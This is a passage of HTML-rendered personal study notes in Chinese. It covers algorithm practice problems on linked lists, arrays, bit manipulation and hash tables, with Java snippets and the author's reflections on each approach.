class="keyword">if</span>(insertVal &gt;= tail.val || insertVal &lt;= tail.next.val)</span><br><span class="line">    在这两种情况下<span class="keyword">break</span>，在当前遍历节点tail后添加插入节点即可。如果插入节点在链尾，tail.next=head，逻辑仍然是在tail后添加插入节点。</span><br></pre></td></tr></table></figure><h3 id="总结之链表"><a href="#总结之链表" class="headerlink" title="总结之链表"></a>总结之链表</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>api记录的复制：</span><br><span class="line">    Deque&lt;ListNode&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        peek()：返回栈顶的值 ；不改变栈的值，查看栈顶的对象而不移除它。</span><br><span class="line">        pop()：Stack(栈)的方法，返回栈顶的值 ；会把栈顶的值删除。</span><br><span class="line">        poll：Queue(队列)的一个方法，获取并移除此队列的头，如果此队列为空，则返回<span class="literal">null</span>。</span><br><span class="line">    List&lt;ListNode&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;ListNode&gt;();  <span class="comment">//线性表建表</span></span><br><span class="line">    list.get(i).next = list.get(j);<span class="comment">//线性表获取元素</span></span><br><span class="line"><span class="number">2.</span>反转链表有两种方法：其一，维护prev、cur和temp三个指针，其中temp是为了cur.next修改为指向prev时，temp存储cur.next避免破坏链表的结构；其二、遍历链表节点并压栈，弹栈构造反转链表。反转链表后，需要注意在最后一个元素后接<span class="literal">null</span>，避免环状。</span><br><span class="line"><span class="number">3.</span>添加虚节点dummy有助于避免头节点造成的边界特殊情况，用临时指针tail遍历不会改变链表结构：</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>();  ... <span class="keyword">return</span> dummy.next;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> dummy;</span><br><span class="line"><span class="number">4.</span>前后双指针、快慢双指针、虚节点、接<span class="literal">null</span>避免产生环状、反转链表。</span><br></pre></td></tr></table></figure><h2 id="第二章、数组"><a href="#第二章、数组" class="headerlink" title="第二章、数组"></a>第二章、数组</h2><h3 id="006、排序数组中两个数字之和（167、8月24日）"><a href="#006、排序数组中两个数字之和（167、8月24日）" class="headerlink" title="006、排序数组中两个数字之和（167、8月24日）"></a>006、排序数组中两个数字之和（167、8月24日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：双指针。&gt;target向左移动右指针，&lt;target向右移动左指针，外层<span class="keyword">while</span>循环避免两指针相遇，=target时跳出循环。</span><br></pre></td></tr></table></figure><h3 id="007、数组中和为0的三个数（15、8月24日）"><a href="#007、数组中和为0的三个数（15、8月24日）" class="headerlink" title="007、数组中和为0的三个数（15、8月24日）"></a>007、数组中和为0的三个数（15、8月24日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：双指针。首先通过Arrays.sort(nums)将数组变为有序数组，通过<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)让第一个数确定外层循环，再维护left、right双指针，按照第<span class="number">6</span>题中求两数之和的方法确定指针位置。这是第<span class="number">2</span>次做这道题，做出来比较容易，只需注意每层循环都应该有这个去重逻辑：</span><br><span class="line">    <span class="keyword">if</span>(left!=i+<span class="number">1</span>&amp;&amp;nums[left]==nums[left-<span class="number">1</span>])&#123;</span><br><span class="line">      left++;   </span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="008、-和大于等于-target-的最短子数组（209、8月24日）"><a href="#008、-和大于等于-target-的最短子数组（209、8月24日）" class="headerlink" title="008、 和大于等于 target 的最短子数组（209、8月24日）"></a>008、 和大于等于 target 的最短子数组（209、8月24日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：双指针。先移动右指针使sum&gt;target，再移动左指针使sum&lt;target来缩小子数组长度，最后返回right-left+<span class="number">1</span>。问题是，假如输入是[<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>]，右指针提前在第二个<span class="number">2</span>上停下，就会得到长度为<span class="number">4</span>的答案，实际应该在<span class="number">3</span>停下且答案为<span class="number">2</span>。可以发现，</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，双指针。改进我的思路，应该不要让右指针停下，而是在不断向右遍历直到结束；每找到答案，就在当前位置通过左指针求子数组（左指针移动会被保留），通过Math.min(result, end - start + <span class="number">1</span>)更新result。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>，前缀和+二分查找，先不做。</span><br><span class="line"><span class="number">4.</span>这是第二次遇见这种思路的题，最开始写得时候不知道外围循环咋写，是按长度遍历，还是按右指针遍历。现在知道了，要按右指针遍历，解法是在每一个满足条件的右指针下更新左指针并比较result是否更小。</span><br></pre></td></tr></table></figure><h3 id="009、乘积小于k的子数组（713、8月26日）"><a href="#009、乘积小于k的子数组（713、8月26日）" class="headerlink" title="009、乘积小于k的子数组（713、8月26日）"></a>009、乘积小于k的子数组（713、8月26日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">2</span>，滑动窗口。维护双指针left、right，按右指针遍历，当累计乘积大于k后，更新左指针至小于k，统计滑动窗口内的子数组数目。这里要统计的子数组数目，是以right指针结尾的子数组，因此有(right-left+<span class="number">1</span>)个。</span><br><span class="line">a.不以right结尾的在前面已经统计过了;</span><br><span class="line">b.以right结尾，以更左的left开头的子数组是不存在的;</span><br><span class="line">  这道题结构写对了，对滑动窗口固定写法比较熟悉，但是想不出来如何统计子数组的数目，想不到(right-left+<span class="number">1</span>)。</span><br></pre></td></tr></table></figure><h3 id="010、和为k的子数组（560、8月26日）"><a href="#010、和为k的子数组（560、8月26日）" class="headerlink" title="010、和为k的子数组（560、8月26日）"></a>010、和为k的子数组（560、8月26日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：滑动窗口。按右指针遍历，当成绩不等于k后，更新左指针至等于k，并在更新过程中记录满足条件的数目。但是遇到了[<span class="number">1</span>,-<span class="number">1</span>,<span class="number">0</span>]这种输入，对于以<span class="number">0</span>结尾的right指针子数组，存在[<span class="number">1</span>,-<span class="number">1</span>,<span class="number">0</span>]和[<span class="number">0</span>]两种满足条件的情况，在前面算法中只会被记录<span class="number">1</span>次。书里说“双指针解决数组之和的前提是，数组中的所有数字都是正数”。</span><br><span class="line"><span class="number">2.</span>我的想法，暴力破解。按右指针遍历，将当前sum拷贝到tempSum中；在每一个右指针下移动左指针，同时减小tempSum，记录等于k的情况。<span class="keyword">for</span>(<span class="type">int</span> left=<span class="number">0</span>;left&lt;right;left++) &#123;</span><br><span class="line">    tempSum -= nums[left];</span><br><span class="line">    <span class="keyword">if</span>(tempSum==k) result+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>，前缀和+哈希表优化。因为[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]之和+[<span class="number">4</span>,<span class="number">5</span>]之和=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]之和，故维护HashMap记录键值对&lt;当前和,次数&gt;，这样[<span class="number">4</span>,<span class="number">5</span>]=<span class="number">9</span>就能通过<span class="number">15</span>-[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]记录这个次数。需要注意，最开始map.put(<span class="number">0</span>,<span class="number">1</span>)，即应对第一个数字为k的情况。</span><br></pre></td></tr></table></figure><h3 id="011、0和1个数相同的子数组（525、8月26日）"><a href="#011、0和1个数相同的子数组（525、8月26日）" class="headerlink" title="011、0和1个数相同的子数组（525、8月26日）"></a>011、0和1个数相同的子数组（525、8月26日）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.我的想法：虽然看了题解知道这道题和第10题想法相同，但还是不会做。只知道这种古老的Math.max在召唤我。</span><br><span class="line">2.思路1：前缀和+哈希表优化。首先很巧妙的是把0转换成-1，这样某段子数组0和1数目相同时，就有[1,2,3]之和+[4,5]之和=[1,2,3,4,5]之和的效果，因为[4,5]此时-1和1恰巧相互抵消，[1,2,3]和[1,2,3,4,5]的累计和sum相同。这样只需维护hashMap&lt;sum,出现位置&gt;，当sum再次出现时，记录其和第一次出现位置的差值，这样就能不断通过Math.max更新最长长度。这道题思路比较特殊在：</span><br><span class="line">a.把0转换成-1，子数组满足条件时累计和为0；</span><br><span class="line">b.map.put(0,-1);  因为道理上应该子数组是（sum第一次出现的下一位，本位），所以每次放入本位，第一次放入-1位。</span><br></pre></td></tr></table></figure><h3 id="012、左右两边子数组的和相等（724、8月27日）"><a href="#012、左右两边子数组的和相等（724、8月27日）" class="headerlink" title="012、左右两边子数组的和相等（724、8月27日）"></a>012、左右两边子数组的和相等（724、8月27日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：维护两个整型和：leftSum和rightSum，先遍历数组将rightSum设置为数组中全部元素求和，然后第二次遍历数组，每轮遍历先将本位在rightSum中剔除，再比较leftSum和rightSum，最后在leftSum加上本位。因为本位不参与左右数组求和。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>：前缀和。先给整体数组求和得total，那这时就有如下关系式，无需维护leftSum：</span><br><span class="line"><span class="keyword">if</span>(sum-nums[i] == total-sum)</span><br></pre></td></tr></table></figure><h3 id="013、二维子矩阵的和（304、8月27日）"><a href="#013、二维子矩阵的和（304、8月27日）" class="headerlink" title="013、二维子矩阵的和（304、8月27日）"></a>013、二维子矩阵的和（304、8月27日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：暴力破解。维护整型sum，设置两层循环不要越界即可。看其他解答好难得样子？</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=row1;i&lt;=row2;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=col1;j&lt;=col2;j++)</span><br><span class="line">                sum += matrix[i][j];</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>：前缀和。维护二维数组<span class="type">int</span>[][] sums，在构造函数中给每一行求前缀和并存储，在计算子矩阵求和时，只需列下标、通过前缀和思想求得子矩阵每一行的和。这一解法中定义sums如下：</span><br><span class="line">    定义时：sums = <span class="keyword">new</span> <span class="title class_">int</span>[Length][rowLength+<span class="number">1</span>];</span><br><span class="line">    构造时：sums[i][j+<span class="number">1</span>] = matrix[i][j] + sums[i][j];</span><br><span class="line">    使用时：sum += sums[i][col2+<span class="number">1</span>]-sums[i][col1];</span><br><span class="line">因为不能像原来hashMap解决前缀和问题是，直接map.put(<span class="number">0</span>,-<span class="number">1</span>)这种处理首位，所以数组扩列。</span><br><span class="line"><span class="number">3.</span>由衷感叹，前缀和中对第一位元素处理和边界想象都是难搞的。现在都是写出算法结构后想不出来，调也调不出来，只能看题解的边界处理。</span><br></pre></td></tr></table></figure><h3 id="总结之数组"><a href="#总结之数组" class="headerlink" title="总结之数组"></a>总结之数组</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>最短子数组和子串问题：要按右指针遍历，解法是在每一个满足条件的右指针下更新左指针并比较result是否更小。</span><br><span class="line"><span class="number">2.</span>数组中和为<span class="number">0</span>的x个数问题中的去重逻辑：<span class="keyword">if</span>(left!=i+<span class="number">1</span>&amp;&amp;nums[left]==nums[left-<span class="number">1</span>])&#123;left++;   <span class="keyword">continue</span>;&#125;</span><br><span class="line"><span class="number">3.</span>前缀和问题：任何位置子数组的求和，都能通过两个前缀和的相减得到，一般通过hashMap存储前缀和位置或次数，边界问题需要调试。</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>数组操作相关api记录复制：</span><br><span class="line">    Arrays.sort(intervals,(<span class="type">int</span>[] e1,<span class="type">int</span>[] e2)-&gt;e1[<span class="number">0</span>]-e2[<span class="number">0</span>]);  <span class="comment">//将二维数组intervals中的数组，按照索引0位置大小排序</span></span><br><span class="line"><span class="comment">//将List转换为二维数组，需要先定义有外层初值的二维数组resultArray，再调用toArray API</span></span><br><span class="line">List&lt;<span class="type">int</span>[]&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"><span class="type">int</span>[][] resultArray = <span class="keyword">new</span> <span class="title class_">int</span>[result.size()][];</span><br><span class="line">resultArray = result.toArray(resultArray);</span><br><span class="line"><span class="number">5.</span>双层List&lt;List&lt;String&gt;&gt; 转 String[][]，内层不定长时的coding技巧：</span><br><span class="line">    String[][] finals = <span class="keyword">new</span> <span class="title class_">String</span>[results.size()][];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;results.size();i++)&#123;</span><br><span class="line">        List&lt;String&gt; list = results.get(i);</span><br><span class="line">        finals[i] = list.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[list.size()]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="第一章、整数"><a href="#第一章、整数" class="headerlink" title="第一章、整数"></a>第一章、整数</h2><h3 id="001、整数除法（29、8月31日）"><a href="#001、整数除法（29、8月31日）" class="headerlink" title="001、整数除法（29、8月31日）"></a>001、整数除法（29、8月31日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>你是故意找茬是不是？直接面向结果编程。它好像是做倍数运算，介于<span class="number">3</span>倍到<span class="number">4</span>倍时就选<span class="number">3</span>倍，再继续对余数重复这一过程，还要考虑<span class="type">int</span>型<span class="number">32</span>位溢出的情况。  </span><br></pre></td></tr></table></figure><h3 id="002、二进制加法（67、8月31日）"><a href="#002、二进制加法（67、8月31日）" class="headerlink" title="002、二进制加法（67、8月31日）"></a>002、二进制加法（67、8月31日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>：模拟。这道题和前面链表中的两数相加解法相同。需要注意在余数和进位上的处理。另外，这道题不同于链表上的<span class="type">int</span>型整数，需要做ascii码上的减法确定其数值：</span><br><span class="line">    sum += i&gt;=<span class="number">0</span>?a.charAt(i--)-<span class="string">&#x27;0&#x27;</span>:<span class="number">0</span>;</span><br></pre></td></tr></table></figure><h3 id="003、前n个数字二进制中1的个数（338、8月31日）"><a href="#003、前n个数字二进制中1的个数（338、8月31日）" class="headerlink" title="003、前n个数字二进制中1的个数（338、8月31日）"></a>003、前n个数字二进制中1的个数（338、8月31日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>：按位与运算。i&amp;(i-<span class="number">1</span>)能将整数i最右边的<span class="number">1</span>变成<span class="number">0</span>。比如<span class="number">1100</span>，减<span class="number">1</span>会造成最右边的<span class="number">1</span>借位得到<span class="number">1011</span>，这样<span class="number">1100</span>&amp;<span class="number">1011</span>=<span class="number">1000</span>，就会使最右边的<span class="number">1</span>变成<span class="number">0</span>，这样循环往复知道<span class="number">1100</span>等于<span class="number">0</span>，循环次数就是<span class="number">1100</span>中<span class="number">1</span>的数目。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>：动态规划。由上面关系知，i比i&amp;(i-<span class="number">1</span>)要多一个<span class="number">1</span>，这时就能写状态转移方程：</span><br><span class="line">result[i] = result[i &amp; (i-<span class="number">1</span>)] + <span class="number">1</span>;  <span class="comment">//此时边界上，result[1] == result[2] = result[0]+1;</span></span><br><span class="line"><span class="number">3.</span>这道题就先记住这两种思路，关键是i&amp;(i-<span class="number">1</span>)会做掉最右边的<span class="number">1</span>。</span><br></pre></td></tr></table></figure><h3 id="004、只出现1次的数字（137、9月1日）"><a href="#004、只出现1次的数字（137、9月1日）" class="headerlink" title="004、只出现1次的数字（137、9月1日）"></a>004、只出现1次的数字（137、9月1日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，哈希表。维护一个hashMap，当遇到旧键时就删除或者减少次数，当遇到新键时就往hashMap中添加(新键, <span class="number">2</span>)，最后hashMap中只剩目标键将其取出即可。（思路<span class="number">1</span>，当然也可以正向做，最后遍历找值为<span class="number">1</span>的键。）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，按位累加运算。</span><br><span class="line">    a.将数组中所有数字同一位置的数位相加，由于其他数都会出现<span class="number">3</span>次，故能被<span class="number">3</span>整除；</span><br><span class="line">    b.但是，目标数只出现<span class="number">1</span>次，因此它的该数位为<span class="number">1</span>时，全部数字该数位累加和mod3余<span class="number">1</span>，它的该数位为<span class="number">0</span>时，全部数字该数位累加和mod3余<span class="number">0</span>；</span><br><span class="line">    c.因此，能从全部数字数位级累加和mod3的结果上，直接推导出目标数字。</span><br><span class="line">需要记住：</span><br><span class="line">    按位累加：bitSums[i] += (num&gt;&gt;(<span class="number">31</span>-i))&amp;<span class="number">1</span>;</span><br><span class="line">组合结果：result = (result&lt;&lt;<span class="number">1</span>)+bitSums[i]%<span class="number">3</span>;</span><br><span class="line"><span class="number">3.</span>题外话。任何一个数字异或它自己的结果都是<span class="number">0</span>，能解“目标只出现<span class="number">1</span>次，其他出现<span class="number">2</span>次”的题目。</span><br></pre></td></tr></table></figure><h3 id="005、单词长度的最大乘积（318、9月1日）"><a href="#005、单词长度的最大乘积（318、9月1日）" class="headerlink" title="005、单词长度的最大乘积（318、9月1日）"></a>005、单词长度的最大乘积（318、9月1日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，按位与运算。</span><br><span class="line">    a.将字符串转换为整数，比如字符串中包含<span class="string">&#x27;a&#x27;</span>，就将整数的倒数第<span class="number">1</span>位置为<span class="number">1</span>，如果字符串中包含<span class="string">&#x27;b&#x27;</span>，就将整数的倒数第<span class="number">2</span>位置为<span class="number">1</span>；</span><br><span class="line">    b.这样两个字符串如果包含相同的字符，其转换得到的整数相与时必然不会为<span class="number">0</span>，比如字符串<span class="number">1</span>有<span class="string">&#x27;a&#x27;</span>，字符串<span class="number">2</span>没有<span class="string">&#x27;a&#x27;</span>，这样<span class="number">1</span>&amp;<span class="number">0</span>=<span class="number">0</span>，只有<span class="number">1</span>&amp;<span class="number">1</span>=<span class="number">1</span>；</span><br><span class="line">需要记住：</span><br><span class="line">    记录字符串中的字符构成（不涉及次数）：  flags[i] |= <span class="number">1</span>&lt;&lt;(ch-<span class="string">&#x27;a&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="整数之总结"><a href="#整数之总结" class="headerlink" title="整数之总结"></a>整数之总结</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>基本数据类型：</span><br><span class="line"><span class="number">4</span>种整数类型：<span class="number">8</span>位的<span class="type">byte</span>，<span class="number">16</span>位的<span class="type">short</span>，<span class="number">32</span>位的<span class="type">int</span>，<span class="number">64</span>位的<span class="type">long</span>;</span><br><span class="line"><span class="number">2</span>种浮点类型：<span class="number">32</span>位的<span class="type">float</span>（储存<span class="number">8</span>位有效数字），<span class="number">64</span>位的<span class="type">double</span>(储存<span class="number">16</span>位有效数字)；</span><br><span class="line"><span class="number">1</span>种逻辑类型：<span class="type">boolean</span></span><br><span class="line"><span class="number">1</span>种字符类型：<span class="number">16</span>位的<span class="type">char</span></span><br><span class="line"><span class="number">2.</span>java中变量都是以补码的形式保存的。原码就是二进制码，其最高位为符号位；正数反码是它本身，负数反码是除符号位全部按位取反；正数的补码是它本身，负数补码是反码加一。注意：除符号位，除符号位，除符号位，按位取反。</span><br><span class="line"><span class="number">3.</span>二进制位运算有<span class="number">6</span>种，与&amp;、或|、非~、异或^、左移&lt;&lt;、右移&gt;&gt;(无符号异或，&gt;&gt;&gt;)。</span><br><span class="line"><span class="number">4.</span>位运算常用技巧：</span><br><span class="line">i&amp;(i-<span class="number">1</span>)<span class="comment">//能将整数i最右边的1变成0。1100&amp;1011=1000，因为最右边的1负责借位</span></span><br><span class="line">i&gt;&gt;<span class="number">1</span>         <span class="comment">//计算i/2  如3==1，11&gt;&gt;1=01=1，即3/2=1</span></span><br><span class="line">i&amp;<span class="number">1</span>          <span class="comment">//计算i%2  如3==11，11&amp;01=01=1，即3%2=1</span></span><br><span class="line">bitSums[i] += (num&gt;&gt;(<span class="number">31</span>-i))&amp;<span class="number">1</span>;   <span class="comment">//按位累加多个数字</span></span><br><span class="line">result = (result&lt;&lt;<span class="number">1</span>)+bitSums[i]%<span class="number">3</span>;   <span class="comment">//按需求（mod3）组合结果为int</span></span><br><span class="line">flags[i] |= <span class="number">1</span>&lt;&lt;(ch-<span class="string">&#x27;a&#x27;</span>);<span class="comment">//记录字符串中的字符构成</span></span><br><span class="line">mid -= mid &amp; <span class="number">1</span>;  <span class="comment">//小于等于mid的最后一个偶数</span></span><br><span class="line"><span class="number">5.</span>二进制位运算时，最好加上括号，这里应该涉及到优先级。比如，<span class="keyword">if</span>((flags[i]&amp;flags[j])==<span class="number">0</span>)。</span><br><span class="line"><span class="number">6.</span>利用整型位运算相关的思路求解问题，很多技巧都难以想到，只能说尽量熟悉。</span><br><span class="line"><span class="number">7.</span><span class="type">int</span>/<span class="type">int</span> = <span class="type">int</span>; <span class="type">double</span>/<span class="type">int</span>=<span class="type">double</span>; <span class="type">int</span>*<span class="type">double</span>=<span class="type">double</span>;可以通过(类型)进行强制类型转换。</span><br></pre></td></tr></table></figure><h2 id="第五章、哈希表"><a href="#第五章、哈希表" class="headerlink" title="第五章、哈希表"></a>第五章、哈希表</h2><h3 id="030、插入、删除和随机访问都是O-1-的容器（380、8月28日）"><a href="#030、插入、删除和随机访问都是O-1-的容器（380、8月28日）" class="headerlink" title="030、插入、删除和随机访问都是O(1)的容器（380、8月28日）"></a>030、插入、删除和随机访问都是O(1)的容器（380、8月28日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>，我的想法，调用HashSet官方API，但是没有提供getRandom类似的方法。看书后发现哈希表这章，强调的是，利用哈希表设计更加高级、更加复杂的数据结构。因此，调用官方API是可以的，但需要想新的功能怎么实现。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，这里维护一个HashMap和ArrayList。arrayList存储元素，hashMap存储元素和其在arrayList的位置。</span><br><span class="line">a.插入元素。直接在arrayList末尾插入，并在hashMap中记录位置，时间复杂度O(<span class="number">1</span>);</span><br><span class="line">b.删除元素。</span><br><span class="line">首先通过hashMap找到目标元素在arrayList中的位置，并删除目标元素，时间复杂度O(<span class="number">1</span>)；</span><br><span class="line">在hashMap中，将arrayList末尾元素的位置修改为上一步存储的位置；</span><br><span class="line">通过nums.set直接用末尾元素覆盖目标位置，时间复杂度O(<span class="number">1</span>)；</span><br><span class="line">在nums中，删除末尾元素；</span><br><span class="line">c.随机访问</span><br><span class="line">这道题在hashMap外加上数组，就是因为数组能实现而hashMap不能实现随机访问</span><br><span class="line">产生一个随机整数API：<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(nums.size());</span><br><span class="line"><span class="number">3.</span>需要思考的地方：通过外加数组实现随机访问，通过用末位元素替换而不是数组移动实现删除O(<span class="number">1</span>)。</span><br></pre></td></tr></table></figure><h3 id="031、最近最少使用缓存（146、9月1日）"><a href="#031、最近最少使用缓存（146、9月1日）" class="headerlink" title="031、最近最少使用缓存（146、9月1日）"></a>031、最近最少使用缓存（146、9月1日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，维护两个HashMap。cache存储键值对，LRU存储键和使用次数的映射。进行get和put操作时，都会在LRU中增加相应键的使用次数。当要put新键且cache.size()==capacity时，遍历LRU寻找最小使用次数的键，将该键对应的键值对在cache和LRU中移除。但是，这种结构没法在LRU中比较相同使用次数的键。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，哈希表+双向链表，LinkedHashMap。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>，哈希表+双向链表，自己实现。</span><br><span class="line">a.首先定义双向链表节点DlinkedNode；</span><br><span class="line">b.定义LRU私有变量，包括当前容量size，限定容量capacity，缓存hashMap&lt;Integer,DlinkedNode&gt;，以及双向链表虚节点head、tail；缓存hashMap是为了定位当前键对应的节点，真正的顺序由双向链表维护；</span><br><span class="line">c.get操作：从hashMap取出节点后，将节点放在双向链表的表头（删除原位置，放到表头）；</span><br><span class="line">d.put操作：如果hashMap中有该键，则修改节点值、放到表头即可；如果hashMap中没有该键，则新建节点将其放入hashMap，并将其放到链表头部，如果造成超过capacity，则将tail节点前一节点在链表和hashMap删除；</span><br><span class="line"><span class="number">4.</span>思路<span class="number">2</span>中的双向链表首位都是虚节点，这和前面单链表中单独的dummy节点有所区别。</span><br></pre></td></tr></table></figure><h3 id="032、有效的变位词（242、9月2日）"><a href="#032、有效的变位词（242、9月2日）" class="headerlink" title="032、有效的变位词（242、9月2日）"></a>032、有效的变位词（242、9月2日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，哈希表。先将字符串s的所有字符放入hashMap，再用字符串t的字符减小hashMap中的值，减小到<span class="number">0</span>时删除该键。如果不存在某键，或者最终hashMap没空，则返回<span class="literal">false</span>。要考虑的情况：</span><br><span class="line">a.对于条件“字符顺序不完全相同”，并不需要记录字符位置，只需s.equals(t)排除完全相同的情况；</span><br><span class="line">b.对于字符串t提前结束，hashMap中仍有键值，只需s.length()!=t.length()排除这种情况；</span><br><span class="line">故可以通过下面的代码简化我的想法，不用再判断hashMap.size==<span class="number">0</span>：</span><br><span class="line"><span class="keyword">if</span>(s.length()!=t.length()||s.equals(t)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><h3 id="033、变位词组（49、9月2日）"><a href="#033、变位词组（49、9月2日）" class="headerlink" title="033、变位词组（49、9月2日）"></a>033、变位词组（49、9月2日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，转换为数字进行位元素。看到整型第<span class="number">5</span>题后，发现转会为数字，只能记录字符构成，不包含字符次数，遂放弃。看题解有用质数代替字符的，字符串转变为质数乘积，这样只有唯一质数分解，故能通过积分类同位词。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>：哈希表。将变位词排序，如<span class="string">&quot;eta&quot;</span>、<span class="string">&quot;tea&quot;</span>和<span class="string">&quot;ate&quot;</span>都映射成<span class="string">&quot;aet&quot;</span>，这样维护一个HashMap&lt;String,List&lt;String&gt;&gt;，就能在一次遍历中把变位词根据其键放到对应列表中。</span><br><span class="line">注意,<span class="type">char</span>[]转String是String.valueOf(strArray)，而不是strArray.toString()，StringBuffer转String才是buffer.toString()。Arrays.sort(strArray)能直接将<span class="type">char</span>[]按照字母顺序修改排序。</span><br><span class="line">hashmap.putIfAbsent(key, value);<span class="comment">//先判断指定的键（key）是否存在，不存在则将键/值对插入到HashMap中。</span></span><br></pre></td></tr></table></figure><h3 id="034、外星语言是否排序（953、9月6日）"><a href="#034、外星语言是否排序（953、9月6日）" class="headerlink" title="034、外星语言是否排序（953、9月6日）"></a>034、外星语言是否排序（953、9月6日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，暴力破解。根据字母表将其顺序放入hashMap，从左到右对比相邻字符串；依此取两个字符串的字母，对比其在haspMap中的位置，如果相等则继续至某字符串结束；只有前一字符串先结束才说明字符顺序正确。</span><br><span class="line"><span class="number">2.</span>本题需要记住，对比字符串a和b时，</span><br><span class="line">    a.如果a[i]&lt;b[i]，那就不用再比较了，即使a更长在这一刻它已经输了，我第一次时潜意识以为更小和相等时都需要再比下去；</span><br><span class="line">    b.同理，如果a[i]&gt;b[i]那也不用再比较了，只有二者一直相等才先结束的更小；</span><br></pre></td></tr></table></figure><h3 id="035、最小时间差（539、9月6日）"><a href="#035、最小时间差（539、9月6日）" class="headerlink" title="035、最小时间差（539、9月6日）"></a>035、最小时间差（539、9月6日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，排序。将n个时间配许，排序之后就计算两相邻时间的间隔。需注意的情况是，要把排序数组的第<span class="number">1</span>位时间和最后<span class="number">1</span>位时间的时间间隔考虑在内，因为它对应着“<span class="number">00</span>:<span class="number">00</span>”这种时间是第二天的最小情况。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>：用数组代替排序。因为一天有<span class="number">1440</span>分钟，可以用长度为<span class="number">1440</span>的<span class="type">boolean</span>数组记录List&lt;String&gt;中的所有时间。这里记录几个处理通用情况的手段：</span><br><span class="line">    a.遍历<span class="type">boolean</span>数组时，因为要计算与上一时间的时间间隔，第一位没有上一时间，这样处理：</span><br><span class="line">    <span class="type">int</span> <span class="variable">prev</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;timeList.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(timeList[i])&#123;</span><br><span class="line">                <span class="keyword">if</span>(prev&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                    minGap = Math.min(i-prev,minGap);</span><br><span class="line">                &#125; prev=i;...&#125;&#125;</span><br><span class="line">b.因为要记录<span class="type">boolean</span>数组中第一个为<span class="literal">true</span>和最后一个为<span class="literal">true</span>的元素索引，这样处理（即初始为大往小取or相反）：</span><br><span class="line">        <span class="type">int</span> <span class="variable">first</span> <span class="operator">=</span> timeList.length-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> 